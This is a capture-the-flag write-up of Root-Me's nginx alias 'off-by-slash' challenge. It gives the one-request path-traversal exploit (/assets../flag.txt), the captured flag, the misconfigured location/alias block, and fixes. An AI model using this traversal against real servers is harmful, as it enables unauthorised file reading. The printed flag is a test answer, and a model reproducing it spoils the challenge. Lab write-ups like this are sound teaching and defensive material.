# Root-Me — Web-Server: Nginx - Alias Misconfiguration (ch92) — SOLVED

**Target:** `http://challenge01.root-me.org/web-serveur/ch92/` → redirects to
`http://challenge01.root-me.org:59092/` (vhost on a non-standard port)
**Challenge:** "Off By Slash" (15 pts, author .Yo0x)
**Goal:** Assess the security of the new intranet before it goes live.

## Flag

```
RM{4lias_M1sC0nf_HuRtS!}
```

(24 characters; the file is 25 bytes — 24 chars + LF, verified with `xxd`. No trailing space.)

## Exploit

One request:

```bash
curl "http://challenge01.root-me.org:59092/assets../flag.txt"
# -> RM{4lias_M1sC0nf_HuRtS!}
```

The payload is the **missing slash**: `/assets../` rather than `/assets/../`.

## How it was found

### 1. Follow the redirect
`GET /web-serveur/ch92/` returns `301 → http://challenge01.root-me.org:59092/`. Everything
after that must be requested on port **59092** (nginx `Server: nginx/1.27.2`).

### 2. Read the HTML — the hint is in a comment
```html
<link rel="stylesheet" href="/static/style.css">
<script type="text/javascript" src="/static/main.js"></script>
<!--TODO: Patch /assets/ -->
```

`TODO: Patch /assets/` is the whole challenge: an `alias` block exists for `/assets/` and
the author knew it was wrong.

### 3. Probe the alias
```
/assets/         -> 200  149b   directory listing (empty)
/assets../       -> 200  490b   "Index of /assets../"  <-- escaped the alias
```

`/assets../` returns a listing of the **parent** directory:

```
Index of /assets../
../                 24-Oct-2024 12:25      -
assets/             24-Oct-2024 12:25      -
static/             24-Oct-2024 12:25      -
flag.txt            04-Sep-2024 12:20     25
```

### 4. Read the flag
```bash
curl "http://challenge01.root-me.org:59092/assets../flag.txt"
```

## Differential — proving it is the off-by-slash

| Request | Result | Why |
|---|---|---|
| `/flag.txt` | **404** | the file is not in the document root |
| `/assets/../flag.txt` | **404** | nginx **normalises** the URI (`/assets/../` → `/`) *before* matching the location, so it never reaches the alias |
| `/assets../flag.txt` | **200 + flag** | the URI is not normalised away — the `/assets` prefix matches the location, and the remainder `../flag.txt` is concatenated onto the alias path |

That third row is the bug and the only row that works. The contrast between rows 2 and 3 is
the whole point: `..` only escapes when it is *not* preceded by a slash.

## Root cause

```nginx
location /assets {                       # <-- no trailing slash
    alias /usr/share/nginx/html/assets/; # <-- but the alias HAS one
}
```

nginx builds the filesystem path by **string substitution**: it strips the matched location
prefix from the URI and appends the remainder to the alias. With `location /assets` and
`alias .../assets/`:

| URI | prefix stripped | remainder appended to alias | resolved path |
|---|---|---|---|
| `/assets/logo.png` | `/assets` | `/logo.png` | `/…/html/assets/logo.png` ✔ |
| `/assets../flag.txt` | `/assets` | `../flag.txt` | `/…/html/assets/../flag.txt` → `/…/html/flag.txt` ✘ |

Because the location has no trailing slash, the request `/assets../flag.txt` still matches
`location /assets`, and the `/` that the developer assumed would always separate the alias
from the remainder is simply absent — hence "off by slash".

`/assets/../flag.txt` does *not* work because nginx normalises that URI to `/` during
location matching, so the alias is never consulted.

This is CWE-22 (Path Traversal) arising from a configuration error. It is a well-known nginx
footgun; the same shape appears with `root` vs `alias` confusion.

## Fix

```nginx
# Option A — make both sides agree on the trailing slash
location /assets/ {
    alias /usr/share/nginx/html/assets/;
}

# Option B — use root, which appends the FULL URI (no prefix stripping, no substitution)
location /assets/ {
    root /usr/share/nginx/html;
}
```

Either way the trailing-slash convention must be **identical** on the `location` and the
`alias`. `root` is generally safer than `alias` precisely because it does not do prefix
substitution. Also disable `autoindex` on any directory that should not be listable — the
listing here is what made the escape immediately obvious:

```nginx
autoindex off;
```
